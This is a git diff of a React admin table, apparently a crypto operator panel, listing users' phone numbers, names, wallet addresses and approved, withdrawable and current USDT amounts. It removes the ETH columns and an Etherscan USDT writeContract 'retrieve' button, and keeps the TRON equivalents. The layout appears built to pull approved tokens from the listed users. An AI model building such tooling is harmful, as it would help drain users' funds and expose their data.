@@ -229,16 +229,11 @@ function NewUserList() {
                                 <Tr bg={headerBg}>
                                     <Th py={3}>전화번호</Th> {/* phone number*/}
                                     <Th py={3}>이름</Th> {/* name*/}
-                                    <Th py={3}>ETH 주소</Th> {/* address*/}
                                     <Th py={3}>TRON 주소</Th> {/* address*/}
-                                    <Th py={3}>출금 가능 erc20 금액</Th> {/* withdrawable*/}
                                     <Th py={3}>출금 가능 trc20 금액</Th> {/* withdrawable*/}
-                                    <Th py={3}>승인된 ERC20 수량</Th> {/* approved*/}
                                     <Th py={3}>승인된 trc20 금액</Th> {/* approved*/}
-                                    <Th py={3}>현재 erc20 금액</Th> {/* current*/}
                                     <Th py={3}>현재 trc20 금액</Th> {/* current*/}
                                     <Th py={3}>가입일</Th> {/* date*/}
-                                    <Th py={3}>erc 회수</Th> {/* eth */}
                                     <Th py={3}>trc 회수</Th> {/* tron */}
                                     <Th py={3}>잔액 새로고침</Th> {/* refresh */}
                                 </Tr>
@@ -261,14 +256,6 @@ function NewUserList() {
                                             </Td>
                                             {/* name */}
                                             <Td>{miner.name}</Td>
-                                            {/* eth address */}
-                                            <Td>
-                                                {
-                                                    miner.ethAddress && (
-                                                        <Button size={"sm"} colorScheme="blue" variant={"ghost"} onClick={() => alert(miner.ethAddress)}>{miner.ethAddress?.slice(0, 4)}...</Button>
-                                                    )
-                                                }
-                                            </Td>
                                             {/* tron address */}
                                             <Td>
                                                 {
@@ -278,24 +265,14 @@ function NewUserList() {
                                                 }
                                             </Td>
                                             {/* withdrawable */}
-                                            <Td>{miner.ethbalance.toLocaleString()}</Td>
                                             <Td>{miner.tronBalance.toLocaleString()}</Td>
                                             {/* approved */}
-                                            <Td>{miner.ethApproveBalanceUSDT.toLocaleString()}</Td>
                                             <Td>{miner.tronApproveBalanceUSDT.toLocaleString()}</Td>
                                             {/* current */}
-                                            <Td>{miner.ethCurrentBalanceUSDT.toLocaleString()}</Td>
                                             <Td>{miner.tronCurrentBalanceUSDT.toLocaleString()}</Td>
                                             {/* date */}
                                             <Td>{new Date(miner.createdAt).toDateString()}</Td>
                                             {/* action */}
-                                            <Td>
-                                                {
-                                                    miner.ethAddress && (
-                                                        <Button as={Link} href="https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#writeContract" target="_blank" size={"sm"} variant={"ghost"} colorScheme="blue">erc 회수</Button>
-                                                    )
-                                                }
-                                            </Td>
                                             <Td>
                                                 {
                                                     miner.tronAddress && (
